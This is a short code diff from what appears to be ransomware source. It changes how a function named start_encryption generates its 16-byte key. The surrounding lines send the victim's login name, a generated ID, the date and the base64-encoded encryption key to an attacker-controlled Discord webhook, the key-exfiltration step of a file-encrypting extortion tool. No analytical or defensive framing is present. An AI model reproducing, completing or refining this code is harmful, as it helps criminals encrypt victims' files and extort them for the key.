@@ -9,6 +9,7 @@ import ctypes
 import hashlib
 import subprocess
 from datetime import datetime
+from Crypto.Random import get_random_bytes
 from concurrent.futures import ThreadPoolExecutor
 
 import requests
@@ -298,7 +299,7 @@ def start_encryption():
     global id
     webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
     id = uuid.uuid1()
-    key = os.urandom(16)
+    key = get_random_bytes(16)
     embed = DiscordEmbed(
         title=f"Username: {os.getlogin()} | ID: {id} | Date: {datetime.now().strftime("%d-%m-%Y")}",
         description=f"Key: {base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()}",
